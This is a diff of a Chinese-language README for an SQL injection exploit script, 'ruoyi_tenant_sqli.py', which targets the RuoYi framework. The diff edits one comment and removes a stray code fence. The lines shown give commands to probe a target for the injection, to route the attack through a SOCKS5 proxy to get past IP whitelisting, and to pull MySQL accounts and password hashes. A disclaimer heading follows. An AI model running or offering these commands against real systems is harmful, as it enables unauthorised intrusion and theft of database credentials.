@@ -27,7 +27,7 @@ pip install requests pycryptodome
 # 1) 探测注入是否存在
 python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 probe
 
-#    经 SOCKS5 代理（目标有 IP 白名单时）
+#    使用代理
 python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 --proxy socks5h://<PROXY_IP>:10800 probe
 
 # 2) 获取 MySQL 账号与密码哈希
@@ -36,7 +36,6 @@ python3 ruoyi_tenant_sqli.py --target http://<TARGET_IP>:8080 --proxy socks5h://
 
 > `--proxy` 等全局参数必须放在子命令 `probe` / `mysql` **之前**。
 
-```
 
 ## 免责声明
 
